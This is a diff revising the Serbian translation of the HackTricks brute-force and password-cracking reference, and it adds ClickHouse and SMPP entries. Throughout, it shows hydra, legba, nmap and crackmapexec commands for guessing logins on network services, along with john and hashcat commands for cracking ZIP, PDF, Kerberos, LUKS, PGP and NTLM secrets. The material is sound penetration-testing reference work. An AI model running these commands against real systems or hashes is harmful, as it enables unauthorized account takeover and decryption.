@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Default Credentials
+## Podrazumevani podaci za prijavu
 
-**Pretražujte na google-u** za podrazumevane akreditive tehnologije koja se koristi, ili **probajte ove linkove**:
+**Pretražite Google** za podrazumevane podatke za prijavu tehnologije koja se koristi, ili **probajte ove linkove**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Kreirajte svoje rečnike**
+## **Kreirajte sopstvene rečnike**
 
-Pronađite što više informacija o meti što možete i generišite prilagođeni rečnik. Alati koji mogu pomoći:
+Prikupite što više informacija o cilju i kreirajte prilagođeni rečnik. Alati koji mogu pomoći:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Liste reči zasnovane na vebsajtovima
+### Wordlists zasnovani na sajtovima
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generišite lozinke na osnovu vašeg znanja o žrtvi (imena, datumi...)
+Generiše lozinke na osnovu vašeg znanja o žrtvi (imena, datumi...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Alat za generisanje rečnika, koji vam omogućava da obezbedite skup reči, dajući vam mogućnost da kreirate više varijacija iz datih reči, stvarajući jedinstven i idealan rečnik za korišćenje u vezi sa specifičnim ciljem.
+Alat za wordlist generator, koji vam omogućava da dostavite skup reči, dajući vam mogućnost da napravite više varijacija od datih reči i kreirate jedinstvenu i idealnu wordlist za upotrebu u odnosu na konkretan target.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Liste reči
+### Wordlists
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,9 +87,9 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Usluge
+## Servisi
 
-Poređano abecedno po imenu usluge.
+Poređano abecedno po imenu servisa.
 
 ### AFP
 ```bash
@@ -109,11 +109,17 @@ nmap --script ajp-brute -p 8009 <IP>
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
-### Касандра
+### Cassandra
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+```
+### ClickHouse
+
+[bruter](https://github.com/vflame6/bruter)
+```bash
+bruter clickhouse -u default -p passwords.txt localhost:9000
 ```
 ### CouchDB
 ```bash
@@ -156,7 +162,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Za http**s** morate promeniti "http-post-form" u "**https-post-form"**
+Za http**s** morate promeniti sa "http-post-form" na "**https-post-form"**
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla ili (D)rupal ili (M)oodle
 ```bash
@@ -278,11 +284,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Da biste koristili **oracle_login** sa **patator** potrebno je da **instalirate**:
+Da biste koristili **oracle_login** sa **patator** potrebno je da **install**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -368,6 +374,10 @@ nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
+### SMPP
+```bash
+bruter smpp -u smppclient1 -p passwords.txt localhost:2775
+```
 ### SMTP
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
@@ -402,11 +412,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Slabi SSH ključevi / Debian predvidljiv PRNG
 
-Neki sistemi imaju poznate greške u nasumičnom semenu koje se koristi za generisanje kriptografskog materijala. To može rezultirati dramatično smanjenim prostorom ključeva koji se može bruteforcovati alatima kao što su [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Takođe su dostupni unapred generisani setovi slabih ključeva kao što su [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Neki sistemi imaju poznate propuste u random seed-u koji se koristi za generisanje kriptografskog materijala. To može rezultirati drastično smanjenim keyspace-om koji se može bruteforce-ovati alatima kao što su [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Prethodno generisani setovi slabih ključeva su takođe dostupni, poput [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)
 
-STOMP tekstualni protokol je široko korišćen protokol za razmenu poruka koji **omogućava besprekornu komunikaciju i interakciju sa popularnim servisima za redove poruka** kao što su RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Pruža standardizovan i efikasan pristup za razmenu poruka i izvođenje raznih operacija sa porukama.
+STOMP tekstualni protokol je široko korišćen protokol za razmenu poruka koji **omogućava besprekornu komunikaciju i interakciju sa popularnim servisima za redove poruka** kao što su RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Pruža standardizovan i efikasan pristup za razmenu poruka i izvođenje različitih operacija vezanih za razmenu poruka.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -446,21 +456,21 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## Lokalno
 
-### Online baze podataka za razbijanje
+### Online cracking baze podataka
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/bez ESS/SSP i sa bilo kojom vrednošću izazova)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashovi, WPA2 snimci i arhive MSOffice, ZIP, PDF...)
-- [https://crackstation.net/](https://crackstation.net) (Hashovi)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashovi i hashovi fajlova)
-- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashovi)
-- [https://www.cmd5.org/](https://www.cmd5.org) (Hashovi)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
-- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
+- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com/)
 
-Proverite ovo pre nego što pokušate da brute force-ujete hash.
+Proverite ovo pre nego što pokušate brute force napad na Hash.
 
 ### ZIP
 ```bash
@@ -478,10 +488,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Napad sa poznatim otvorenim tekstom na zip
+#### Known plaintext zip attack
 
-Morate znati **otvoreni tekst** (ili deo otvorenog teksta) **fajla koji se nalazi unutar** enkriptovanog zip-a. Možete proveriti **imena fajlova i veličinu fajlova koji se nalaze unutar** enkriptovanog zip-a pokretanjem: **`7z l encrypted.zip`**\
-Preuzmite [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sa stranice za izdanja.
+Potrebno je da znate **plaintext** (ili deo **plaintext**-a) **fajla koji se nalazi u** enkriptovanom zip-u. Možete proveriti **imena fajlova i veličine fajlova koji se nalaze u** enkriptovanom zip-u pokretanjem: **`7z l encrypted.zip`**\
+Preuzmite [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sa stranice Releases.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -513,9 +523,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF Owner Password
+### Vlasnička lozinka PDF-a
 
-Da biste probili PDF Owner lozinku, proverite ovo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Za probijanje vlasničke lozinke PDF-a pogledajte ovo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -549,11 +559,11 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Luks slika
+### LUKS image
 
-#### Metoda 1
+#### Metod 1
 
-Instalirajte: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Instalacija: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -577,7 +587,7 @@ Još jedan Luks BF tutorijal: [http://blog.dclabs.com.br/2020/03/bruteforcing-li
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Privatni ključ
+### PGP/GPG privatni ključ
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -592,10 +602,10 @@ Koristite [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john
 
 ### Open Office Pwd Protected Column
 
-Ako imate xlsx datoteku sa kolonom zaštićenom lozinkom, možete je otključati:
+Ako imate xlsx fajl sa kolonom zaštićenom lozinkom, možete ukloniti zaštitu:
 
-- **Otpremite je na google drive** i lozinka će biti automatski uklonjena
-- Da **uklonite** to **ručno**:
+- **Otpremite ga na google drive** i lozinka će biti automatski uklonjena
+- Da biste ga **uklonili** **ručno**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -604,7 +614,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-### PFX Sertifikati
+### PFX sertifikati
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
@@ -613,7 +623,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 ## Alati
 
-**Primeri hešova:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash primeri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 ```bash
@@ -627,33 +637,33 @@ hash-identifier
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Alati za generisanje rečnika**
+### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator za šetnju tastaturom sa konfigurisanim osnovnim karakterima, rasporedom tastera i rutama.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredan generator keyboard-walk-a sa podesivim base chars, keymap-om i routes-ima.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-Pročitajte _**/etc/john/john.conf**_ i konfigurišite ga
+Pročitaj _**/etc/john/john.conf**_ i konfiguriši ga
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat napadi
+#### Hashcat attacks
 
-- **Napad sa rečnikom** (`-a 0`) sa pravilima
+- **Wordlist attack** (`-a 0`) uz pravila
 
-**Hashcat** već dolazi sa **folderom koji sadrži pravila** ali možete pronaći [**druga zanimljiva pravila ovde**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** već dolazi sa **folderom koji sadrži pravila** ali možete pronaći [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** napad
+- **Wordlist combinator** attack
 
-Moguće je **kombinovati 2 rečnika u 1** sa hashcat-om.\
-Ako je lista 1 sadržala reč **"hello"** a druga je sadržala 2 reda sa rečima **"world"** i **"earth"**. Reči `helloworld` i `helloearth` će biti generisane.
+Moguće je **combine 2 wordlists into 1** pomoću hashcat.\
+Ako lista 1 sadrži reč **"hello"**, a druga sadrži 2 reda sa rečima **"world"** i **"earth"**, generisaće se reči `helloworld` i `helloearth`.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -704,23 +714,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat modovi
+#### Hashcat režimi
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Razbijanje Linux hešova - /etc/shadow datoteka
+Cracking Linux Hashes - /etc/shadow file
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Razbijanje Windows hešova
+Cracking Windows Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Razbijanje uobičajenih hešova aplikacija
+Cracking uobičajenih hashes aplikacija
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
